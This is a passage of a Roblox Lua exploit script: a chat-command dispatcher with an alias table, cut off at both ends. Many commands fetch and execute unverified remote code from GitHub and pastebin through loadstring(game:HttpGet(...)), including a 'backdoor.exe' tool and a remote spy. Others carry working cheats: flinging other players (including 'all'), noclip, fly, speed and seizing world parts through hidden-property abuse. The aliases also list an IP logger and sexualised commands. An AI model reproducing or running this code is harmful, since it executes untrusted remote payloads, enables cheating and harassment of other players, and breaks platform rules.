		muteradio = {"muteradio","muteboombox","tempmuteradio","tempmuteboombox"},
		loopmuteradio = {"lmuteradio","lmuteboombox","loopmuteradio","loopmuteboombox"},
		unloopmuteradio = {"unlmuteradio","unlmuteboombox","unloopmuteradio","unloopmuteboombox"},
		audiologs = {"al","audiologs","audiologger"},
		glitchradio = {"gradio","gboombox","glitchradio","glitchboombox"},
		bdexe = {"bdexe","backdoorexe","backdoordotexe"},
		frakturess = {"fss","frakture","frakturess"},
		chatbot = {"cb","bot","cbot","chatb","chatbot"},
		antifling = {"af","antif","afling","antifling"},
		quizgui = {"quiz","quizg","quizgui","quizhub","quizes"},
		chatdraw = {"cd","chatd","drawc","chatdraw","drawinchat"},
		shyguy = {"096","shyguy","scp096"},
		spygui = {"spy","spygui","spyonpeople"},
		hug = {"hug","hugger","hugpeople"},
		skibidirizz = {"skibidirizz","sigmarizz","therizzlerishere","sigmarizzler","top10rizzler"},
		rizzgui = {"rizz","rizzler","rizzgui","rizzlergui"},
		emotegui = {"emotes","emotegui","tiktokrizzgui"},
		blackhole = {"blackhole","theblackhole","unanchoredpartsball"},
		obbytroll = {"obbytroll","obbytroller","activatedisappearingparts"},
		rejoin = {"rj","rej","rejoin"},
		serverhop = {"sh","shop","serverh","serverhop"},
		graphics = {"rtx","rotx","graphics","realistic","realisticgraphics"},
		speed = {"ws","sped","speed","tpwalk","walkspeed","teleportwalk"},
		unspeed = {"unws","unsped","unspeed","untpwalk","unwalkspeed","unteleportwalk"},
		fly = {"fly","flybypass"},
		unfly = {"unfly","unflybypass"},
		noclip = {"noclip"},
		clip = {"clip","unnoclip"},
		goto = {"to","goto","tpto","teleportto"},
		remotespy = {"rspy","remspy","remotespy","simplespy"},
		chatbypass = {"chatb","chatbypass","betterbypasser"},
		collisions = {"col","collisions","playercollisions","becomeflingable"},
		brookhaven = {"icehub","brookhaven","brookhavengui","brookhavenhub"},
		emojichat = {"emojis","emojichat","emojisinchat","emojiautocomplete"},
		vghub = {"vghub"},
		scpfuturistic = {"scpf","scpfuture","scpfuturistic","egodscpfgui"},
		toggletouch = {"toggletouch","togglekillparts","togglekillbricks"},
		invis = {"invis","invisible"},
		doorsgui = {"doors","doorsgui","doorshub"},
		translator = {"translate","translator","chattranslate","chattranslator"},
		chatspy = {"chatspy","legacychatspy"},
		unglitchradio = {"ungradio","ungboombox","unglitchradio","unglitchboombox"},
		animlogs = {"animlogs","animlogger","animationlogs","animationlogger"},
		iplog = {"ip","iplog","iplogger","fakeip","fakeiplog","fakeiplogger"},
		vrsetup = {"vr","vrsu","vrsetup","virtualrealitysetup"},
		walkonwalls = {"grav","gravity","spiderman","walkonwalls"},
		rochipscmds = {"rccmds","rochipscmds","rochipscommands"},
		rochipsadminpanel = {"rcap","rcadmin","rcadminpanel","rochipsadmin","rochipsadminpanel"},
		rochipsuni = {"rcup","rcuni","rcunipanel","rcuniversal","rochipsuni","rochipsuniversal"},
		jorking = {"jerk","jork","jack","stroke"},
		antibackshots = {"antibs","antibackshots"},
		autobackshots = {"autobs","autobackshots"},
		febypass = {"febypass","test"}, -- kind of was convincing so added it
		reset = {"oof","ded","die","dead","reset"},
		fastreset = {"re","res","spawn","respawn","fastreset"},
		posreset = {"oofp","dedp","diep","deadp","resetp"},
		posfastreset = {"ref","refresh","fastresetp"},
		scp173 = {"173","scp173","peanut","thesculpture"},
		spooflocalplayer = {"slp","spooflp","spooflocalplayer"},
		fakewallhop = {"fwh","wallhop","fakewallhop"},
		ball = {"ball","beball","becomeball"},
		info = {"infostuff","infothings"},
			
	}
	
	function Commands(pf, text)
		local split = string.split(string.lower(text), "/")
		local cmd = split[1]
		local arg1 = split[2]
		local arg2 = split[3]
	
		for _, name in pairs(allcmds.iy) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
				end)
			end
		end
	
		for _, name in pairs(allcmds.dex) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonzyDev/Roblox-Scripts/refs/heads/main/BypassedDarkDexV3.lua"))()
				end)
			end
		end
	
		for _, name in pairs(allcmds.punch) do
			if cmd == pf..name then
				task.spawn(function()
					local hiddenfling = false
	
					game:GetService("UserInputService").InputBegan:Connect(function(Input, GPE)
						if GPE then return end
	
						if Input.KeyCode == Enum.KeyCode.K then
							local p = game:GetService("Players").LocalPlayer
							local c = p.Character
							local h = c:FindFirstChildOfClass("Humanoid")
							if h.RigType == Enum.HumanoidRigType.R6 then
								local anim = Instance.new("Animation")
								anim.AnimationId = "rbxassetid://204062532"
								local track = h:LoadAnimation(anim)
								track:Play(.1)
								task.spawn(function()
									hiddenfling = true
									task.wait(2)
									hiddenfling = false
								end)
							elseif h.RigType == Enum.HumanoidRigType.R15 then
								local anim = Instance.new("Animation")
								anim.AnimationId = "rbxassetid://567480369"
								local track = h:LoadAnimation(anim)
								track:Play(.1)
								task.spawn(function()
									hiddenfling = true
									task.wait(2)
									hiddenfling = false
								end)
							end
						end
					end)
	
					local function fling()
						local hrp, c, vel, movel = nil, nil, nil, 0.1
						while true do
							game:GetService("RunService").Heartbeat:Wait()
							if hiddenfling then
								local lp = game:GetService("Players").LocalPlayer
								while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
									game:GetService("RunService").Heartbeat:Wait()
									c = lp.Character
									hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
								end
								if hiddenfling then
									vel = hrp.Velocity
									hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
									game:GetService("RunService").RenderStepped:Wait()
									if c and c.Parent and hrp and hrp.Parent then
										hrp.Velocity = vel
									end
									game:GetService("RunService").Stepped:Wait()
									if c and c.Parent and hrp and hrp.Parent then
										hrp.Velocity = vel + Vector3.new(0, movel, 0)
										movel = movel * -1
									end
								end
							end
						end
					end
	
					fling()
				end)
			end
		end
	
		for _, name in pairs(allcmds.fly) do
			if cmd == pf..name then
				task.spawn(function()
					local ctrlModule = nil 
					pcall(function() ctrlModule = require(game:GetService("Players").LocalPlayer:FindFirstChildOfClass("PlayerScripts"):WaitForChild('PlayerModule',5):WaitForChild("ControlModule",5)) end)
					
					TFlyEnabled = true
					local speed=args1 ~= nil and arg1 or 2
					if speed==nil then
						speed=2
					end
					local e1, e2
					local Hum, mouse = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"), game:GetService("Players").LocalPlayer:GetMouse()
					tflyCORE = Instance.new("Part",game:GetService("Workspace"))
					tflyCORE:SetAttribute("tflyPart",true)
					tflyCORE.Size, tflyCORE.CanCollide = Vector3.new(0.05, 0.05, 0.05), false
					local Trs = tflyCORE

					local keys = { a = false, d = false, w = false, s = false }
					if IsOnPC then
						e1 = mouse.KeyDown:Connect(function(key)
							if not Trs or not Trs.Parent then
								e1:Disconnect()
								e2:Disconnect()
								return
							end
							if key == "w" then
								keys.w = true
							elseif key == "s" then
								keys.s = true
							elseif key == "a" then
								keys.a = true
							elseif key == "d" then
								keys.d = true
							end
						end)
						e2 = mouse.KeyUp:Connect(function(key)
							if key == "w" then
								keys.w = false
							elseif key == "s" then
								keys.s = false
							elseif key == "a" then
								keys.a = false
							elseif key == "d" then
								keys.d = false
							end
						end)
					end

					local Weld = Instance.new("Weld", tflyCORE)
					Weld.Part0, Weld.Part1, Weld.C0 = tflyCORE, Hum.RootPart, CFrame.new(0, 0, 0)

					local pos, gyro = Instance.new("BodyPosition", game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart",9e9)), Instance.new("BodyGyro", game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart",9e9))
					pos.maxForce, pos.position = Vector3.new(math.huge, math.huge, math.huge), game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart",9e9).Position
					gyro.maxTorque, gyro.cframe = Vector3.new(9e9, 9e9, 9e9), game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart",9e9).CFrame

					repeat
						wait()
						Hum.PlatformStand = true
						local new = gyro.cframe - gyro.cframe.p + pos.position

						if IsOnPC then
							if keys.w then
								new = new + game:GetService("Workspace").CurrentCamera.CoordinateFrame.lookVector * speed
							end
							if keys.s then
								new = new - game:GetService("Workspace").CurrentCamera.CoordinateFrame.lookVector * speed
							end
							if keys.d then
								new = new * CFrame.new(speed, 0, 0)
							end
							if keys.a then
								new = new * CFrame.new(-speed, 0, 0)
							end
						elseif IsOnMobile then
							local direction = ctrlModule:GetMoveVector()
							if direction.Magnitude > 0 then
								new = new + (direction.X * game:GetService("Workspace").CurrentCamera.CFrame.RightVector * speed)
								new = new - (direction.Z * game:GetService("Workspace").CurrentCamera.CFrame.LookVector * speed)
							end
						end

						pos.position = new.p
						if keys.w then
						gyro.cframe = game:GetService("Workspace").CurrentCamera.CoordinateFrame
						elseif keys.s then
							gyro.cframe = game:GetService("Workspace").CurrentCamera.CoordinateFrame
						else
							gyro.cframe = game:GetService("Workspace").CurrentCamera.CoordinateFrame
						end
					until TFlyEnabled == false
					if gyro then
						gyro:Destroy()
					end
					if pos then
						pos:Destroy()
					end
					Hum.PlatformStand = false
					speed = 10
				end)
			end
		end

		for _, name in pairs(allcmds.cmds) do
			if cmd == pf..name then
				task.spawn(function()
					cmdlist.Visible = true
				end)
			end
		end

		for _, name in pairs(allcmds.hug) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/fe/refs/heads/main/FEHUGG"))()
				end)
			end
		end

		for _, name in pairs(allcmds.clip) do
			if cmd == pf..name then
				task.spawn(function()
					if Noclipping then
						Noclipping:Disconnect()
						for _, child in pairs(speaker.Character:GetDescendants()) do
							if child:IsA("BasePart") and child.CanCollide == false and child.Name ~= floatName then
								child.CanCollide = true
							end
						end
					end
					Clip = true
				end)
			end
		end

		for _, name in pairs(allcmds.cmdx) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
				end)
			end
		end

		for _, name in pairs(allcmds.goto) do
			if cmd == pf..name then
				task.spawn(function()
					local Username = arg1


					char = game:GetService("Players").LocalPlayer

					TweenService = game:GetService("TweenService")

					speaker = game:GetService("Players").LocalPlayer
					Players = game:GetService("Players")

					local players = getPlr(Username)
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = getRoot(players.Character).CFrame + Vector3.new(3,1,0)}):Play()
				end)
			end
		end

		for _, name in pairs(allcmds.bdexe) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/k4scripts/backdoor.exe/v8/src/main.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.fling) do
			if cmd == pf..name then
				task.spawn(function()
					local player = game:GetService("Players").LocalPlayer
					local mouse = player:GetMouse()
					local Targets = {arg1}

					local Players = game:GetService("Players")
					local Player = Players.LocalPlayer

					local AllBool = false

					local GetPlayer = function(Name)
						Name = Name:lower()
						if Name == "all" or Name == "others" then
							AllBool = true
							return
						elseif Name == "random" then
							local GetPlayers = Players:GetPlayers()
							if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
							return GetPlayers[math.random(#GetPlayers)]
						elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
							for _,x in next, Players:GetPlayers() do
								if x ~= Player then
									if x.Name:lower():match("^"..Name) then
										return x;
									elseif x.DisplayName:lower():match("^"..Name) then
										return x;
									end
								end
							end
						else
							return
						end
					end

					local Message = function(_Title, _Text, Time)
						game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
					end

					local SkidFling = function(TargetPlayer)
						local Character = Player.Character
						local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
						local RootPart = Humanoid and Humanoid.RootPart

						local TCharacter = TargetPlayer.Character
						local THumanoid
						local TRootPart
						local THead
						local Accessory
						local Handle

						if TCharacter:FindFirstChildOfClass("Humanoid") then
							THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
						end
						if THumanoid and THumanoid.RootPart then
							TRootPart = THumanoid.RootPart
						end
						if TCharacter:FindFirstChild("Head") then
							THead = TCharacter.Head
						end
						if TCharacter:FindFirstChildOfClass("Accessory") then
							Accessory = TCharacter:FindFirstChildOfClass("Accessory")
						end
						if Accessory and Accessory:FindFirstChild("Handle") then
							Handle = Accessory.Handle
						end

						if Character and Humanoid and RootPart then
							if RootPart.Velocity.Magnitude < 50 then
								getgenv().OldPos = RootPart.CFrame
							end
							if THumanoid and THumanoid.Sit and not AllBool then
							end
							if THead then
								workspace.CurrentCamera.CameraSubject = THead
							elseif not THead and Handle then
								workspace.CurrentCamera.CameraSubject = Handle
							elseif THumanoid and TRootPart then
								workspace.CurrentCamera.CameraSubject = THumanoid
							end
							if not TCharacter:FindFirstChildWhichIsA("BasePart") then
								return
							end

							local FPos = function(BasePart, Pos, Ang)
								RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
								Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
								RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
								RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
							end

							local SFBasePart = function(BasePart)
								local TimeToWait = 2
								local Time = tick()
								local Angle = 0

								repeat
									if RootPart and THumanoid then
										if BasePart.Velocity.Magnitude < 50 then
											Angle = Angle + 100

											FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
											task.wait()
										else
											FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
											task.wait()

											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
											task.wait()
										end
									else
										break
									end
								until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
							end

							workspace.FallenPartsDestroyHeight = 0/0

							local BV = Instance.new("BodyVelocity")
							BV.Name = "EpixVel"
							BV.Parent = RootPart
							BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
							BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

							Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

							if TRootPart and THead then
								if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
									SFBasePart(THead)
								else
									SFBasePart(TRootPart)
								end
							elseif TRootPart and not THead then
								SFBasePart(TRootPart)
							elseif not TRootPart and THead then
								SFBasePart(THead)
							elseif not TRootPart and not THead and Accessory and Handle then
								SFBasePart(Handle)
							else
							end

							BV:Destroy()
							Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
							workspace.CurrentCamera.CameraSubject = Humanoid

							repeat
								RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
								Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
								Humanoid:ChangeState("GettingUp")
								table.foreach(Character:GetChildren(), function(_, x)
									if x:IsA("BasePart") then
										x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
									end
								end)
								task.wait()
							until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
							workspace.FallenPartsDestroyHeight = getgenv().FPDH
						else
						end
					end

					getgenv().Welcome = true
					if Targets then for _,x in next, Targets do GetPlayer(x) end else return end

					if AllBool then
						for _,x in next, Players:GetPlayers() do
							SkidFling(x)
						end
					end

					for _,x in next, Targets do
						if GetPlayer(x) and GetPlayer(x) ~= Player then
							if GetPlayer(x).UserId ~= 4603013888 then
								local TPlayer = GetPlayer(x)
								if TPlayer then
									SkidFling(TPlayer)
								end
							else
							end
						elseif not GetPlayer(x) and not AllBool then
						end
					end
				end)
			end
		end

		for _, name in pairs(allcmds.invis) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
				end)
			end
		end

		for _, name in pairs(allcmds.speed) do
			if cmd == pf..name then
				task.spawn(function()
					if TPWalk == true then
						TPWalk = false
						TPWalking = TPWalking:Disconnect()
					end
					TPWalk = true
					Speed = arg1
					TPWalking = game:GetService("RunService").Heartbeat:Wait()
					game:GetService("RunService").Stepped:Connect(function()
						if TPWalk == true then
							if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection.Magnitude > 0 then
								if Speed then
									game:GetService("Players").LocalPlayer.Character:TranslateBy(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * Speed * TPWalking * 10)
								else
									game:GetService("Players").LocalPlayer.Character:TranslateBy(game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").MoveDirection * TPWalking * 10)
								end
							end
						end
					end)
				end)
			end
		end

		for _, name in pairs(allcmds.unfly) do
			if cmd == pf..name then
				task.spawn(function()
					TFlyEnabled = false
					for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
						if v:GetAttribute("tflyPart") then
							v:Destroy()
						end
					end
				end)
			end
		end

		for _, name in pairs(allcmds.vghub) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
				end)
			end
		end

		for _, name in pairs(allcmds.noclip) do
			if cmd == pf..name then
				task.spawn(function()
					Clip = false
					wait(0.1)
					local function NoclipLoop()
						if Clip == false and speaker.Character ~= nil then
							for _, child in pairs(speaker.Character:GetDescendants()) do
								if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
									child.CanCollide = false
								end
							end
						end
					end
					Noclipping = RunService.Stepped:Connect(NoclipLoop)
				end)
			end
		end

		for _, name in pairs(allcmds.rejoin) do
			if cmd == pf..name then
				task.spawn(function()
					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
				end)
			end
		end

		for _, name in pairs(allcmds.shyguy) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/SpiderScriptRB/SpiderScriptRBUniversal/refs/heads/main/Protected_Spider.txt"))()
				end)
			end
		end

		for _, name in pairs(allcmds.spygui) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/uPGrjsd6"))()
				end)
			end
		end

		for _, name in pairs(allcmds.uncmds) do
			if cmd == pf..name then
				task.spawn(function()
					cmdlist.Visible = false
				end)
			end
		end

		for _, name in pairs(allcmds.chatbot) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.chatspy) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/iMSiUd3k"))()
				end)
			end
		end

		for _, name in pairs(allcmds.quizgui) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))()
				end)
			end
		end

		for _, name in pairs(allcmds.rizzgui) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/OpenSource/main/rizzler.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.unspeed) do
			if cmd == pf..name then
				task.spawn(function()
					TPWalk = false
					TPWalking = TPWalking:Disconnect()
				end)
			end
		end

		for _, name in pairs(allcmds.chatdraw) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/Chatdraw/refs/heads/main/Chattdraw"))()
				end)
			end
		end

		for _, name in pairs(allcmds.doorsgui) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
				end)
			end
		end

		for _, name in pairs(allcmds.emotegui) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Gi7331/scripts/main/Emote.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.graphics) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()
				end)
			end
		end

		for _, name in pairs(allcmds.antifling) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/mHaznh3T"))()
				end)
			end
		end

		for _, name in pairs(allcmds.audiologs) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'))()
				end)
			end
		end

		for _, name in pairs(allcmds.blackhole) do
			if cmd == pf..name then
				task.spawn(function()
					--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local angle = 1
local radius = 10
local blackHoleActive = false

local function setupPlayer()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    return humanoidRootPart, Attachment1
end

local humanoidRootPart, Attachment1 = setupPlayer()

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(2)

                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius

                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
            end
        end)
    else
        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    humanoidRootPart, Attachment1 = setupPlayer()
    if blackHoleActive then
        toggleBlackHole()
    end
end)

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
local window = library:Window("Project KGGJGBINY idk")

window:Slider("Radius Blackhole",1,100,10, function(Value)
   radius = Value
end)

window:Toggle("Blackhole", true, function(Value)
       if Value then
            toggleBlackHole()
        else
            blackHoleActive = false
        end
end)

spawn(function()
    while true do
        RunService.RenderStepped:Wait()
        if blackHoleActive then
            angle = angle + math.rad(angleSpeed)
        end
    end
end)

toggleBlackHole()
				end)
			end
		end

		for _, name in pairs(allcmds.emojichat) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://pastebin.com/raw/YsY4jXJD"))()
				end)
			end
		end

		for _, name in pairs(allcmds.muteradio) do
			if cmd == pf..name then
				task.spawn(function()
					task.spawn(function()
						Username = arg1
						if game:GetService("SoundService").RespectFilteringEnabled == true then
							print("Muted Radio as Client")
						else
							print("Muted Radio as FE")
							if Username == "all" or Username == "others" then
								local players = game:GetService("Players"):GetPlayers()
								for _, player in ipairs(players) do
									for _, object in ipairs(player.Character:GetDescendants()) do
										if object:IsA("Sound") and object.Playing then
											object:Stop()
										end
									end
									local backpack = player:FindFirstChildOfClass("Backpack")
									if backpack then
										for _, object in ipairs(backpack:GetDescendants()) do
											if object:IsA("Sound") and object.Playing then
												object:Stop()
											end
										end
									end
								end			
							else
								local players = getPlr(Username)
								if players ~= nil then
									for i, x in next, players.Character:GetDescendants() do
										if x:IsA("Sound") and x.Playing == true then
											x.Playing = false
										end
									end
									for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
										if x:IsA("Sound") and x.Playing == true then
											x.Playing = false
										end
									end
								end 
							end
						end
					end)
					local plrs = game:GetService("Players"):FindFirstChild(arg1)
					if arg1 ~= plrs.Name then
						output.Text = "Error: Player not found."
						task.wait(4)
						output.Text = ""
					elseif arg1 == plrs.Name then
						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
						task.wait(4)
						output.Text = ""
					end
				end)
			end
		end

		for _, name in pairs(allcmds.obbytroll) do
			if cmd == pf..name then
				task.spawn(function()
					pcall(function()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/obby-ruiner/main/obby-ruiner.lua"))()
					end)
				end)
			end
		end

		for _, name in pairs(allcmds.remotespy) do
			if cmd == pf..name then
				task.spawn(function()
					loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
				end)
			end
		end

		for _, name in pairs(allcmds.serverhop) do
			if cmd == pf..name then
				task.spawn(function()
					local plr = game:GetService("Players").LocalPlayer
					plr:Kick("E Commands FE - Attempting to server hop...")
					game:GetService("TeleportService"):Teleport(game.PlaceId,plr)
				end)
			end
		end

		for _, name in pairs(allcmds.spinfling) do
			if cmd == pf..name then
				task.spawn(function()
					function getRoot(char)
